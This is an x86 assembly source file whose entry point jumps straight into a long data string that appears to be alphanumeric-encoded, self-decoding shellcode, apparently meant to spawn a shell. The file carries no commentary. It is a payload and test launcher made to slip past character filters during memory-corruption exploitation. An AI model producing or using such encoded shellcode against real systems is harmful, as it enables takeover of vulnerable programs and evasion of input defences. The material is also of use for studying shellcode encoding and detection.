	.intel_syntax noprefix
	.globl	_start
	
	.text
_start:
	lea	ecx, shellcode
        jmp     ecx
	
	.data
shellcode:
	.ascii "PQRSPUQWahaaaaX5aaaaHhaaa0X5aaaOPDDDTYhaaaaX5aaaaHPQRPPUVWa09haaaAX5aaasPDDDTYhaaaaX5aaaaHPQRPPUVWa09haaa2X5aaa9PDDDhaaa5X5aaazPDDDTYhaaaaX5aaaaHPQRPPUVWa09haaaEX5aaazPDDDTYhaaaaX5aaaaHPQRPPUVWa09haaa1DDDhaaaDX5aaaZPDDDTYhaaaaX5aaaaHPQRPPUVWa09haaa0X5aaaFPDDDTYhaaaaX5aaaaHPQRPPUVWa09haaaSDDDhaaaRDDDhaaaAX5aaalPDDDTYhaaaaX5aaaaHPQRPPUVWa09haaa1DDDhaaaDX5aaaXPDDDTYhaaaaX5aaaaHPQRPPUVWa09haaa0X5aaaFPDDDTYhaaaaX5aaaaHPQRPPUVWa09haaanDDDhaaaiDDDhaaabDDDhaaaAX5aaanPDDDhaaahDDDhaaa0X5aaa0PDDDhaaahDDDhaaasDDDhaaaAX5aaanPDDDhaaahDDDPQRSPUVVahaaa0DDDhaaa0DDDhaaa4X5aaa8PDDDTYhaaaaX5aaaaHPQRPPUVWa09haaa0DDDYPQQSPUVWahaaa0X5aaa0PDDDhaaa0X5aaa0PDDDAAAAAAAAAAAAAAAAAAAAAAAAAhaaa0X5aaa1PDDDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhaaalDDDAX04GT0"
